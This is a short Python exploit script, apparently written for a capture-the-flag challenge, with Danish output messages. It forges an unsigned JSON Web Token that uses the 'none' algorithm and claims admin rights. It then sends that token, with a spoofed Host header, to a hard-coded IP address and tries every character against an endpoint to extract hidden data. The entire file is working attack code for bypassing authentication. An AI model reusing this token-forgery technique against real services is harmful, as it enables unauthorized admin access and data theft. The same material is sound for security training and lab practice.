#!/usr/bin/env python3
import base64, json, requests, string

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

SS = "77.74.147.54"
HOST = "secret-server.hkn"

h1 = b64url(json.dumps({"alg":"none","typ":"JWT"}, separators=(',',':')).encode())
p1 = b64url(json.dumps({"admin":True,"timestamp":1300000000}, separators=(',',':')).encode())
JWT_FORGED = f"{h1}.{p1}."

charset = list(string.ascii_letters + string.digits + "!@#$%^&*()_+-=:;,.<>?/~`|\\[]{}")

results = {}
for c in charset:
    try:
        r = requests.get(f"http://{SS}/next_chars", params={"char": c},
                          headers={"Host": HOST, "JWT": JWT_FORGED}, timeout=3)
        if r.text.strip() not in ("[]", ""):
            results[c] = r.text.strip()
    except Exception as e:
        pass

print("=== Resultater MED forged admin:true JWT ===")
for c, v in results.items():
    print(f"char={c!r} -> {v}")

print(f"\nAntal ikke-tomme: {len(results)}")
